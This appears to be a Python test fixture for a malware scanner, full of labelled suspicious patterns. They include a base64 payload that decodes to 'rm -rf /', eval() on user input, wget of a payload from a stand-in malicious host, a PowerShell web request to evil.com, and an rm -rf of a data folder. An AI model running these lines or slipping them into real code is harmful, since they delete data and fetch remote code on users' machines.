#!/usr/bin/env python3
"""
Suspicious Python Script - Test File 1
This file contains multiple malware indicators for testing
"""

import base64
import os
import subprocess

# Suspicious: Base64 encoded payload
encoded_data = "cHl0aG9uIC1jICdpbXBvcnQgb3M7IG9zLnN5c3RlbSgicm0gLXJmIC8iKSc="
decoded_payload = base64.b64decode(encoded_data)

# Suspicious: eval() usage - can execute arbitrary code
user_input = input("Enter command: ")
eval(user_input)

# Suspicious: exec() usage - another code execution method
malicious_code = "print('Malware executed')"
exec(malicious_code)

# Suspicious: Downloading from internet
download_url = "http://malicious-site.com/payload.exe"
os.system(f"wget {download_url}")

# Suspicious: PowerShell execution
subprocess.call(["powershell", "-Command", "Invoke-WebRequest http://evil.com"])

# Suspicious: File deletion
os.system("rm -rf /tmp/important_data")

# Clean code (should not be detected)
def legitimate_function():
    result = 10 + 20
    return result

print("Script completed")
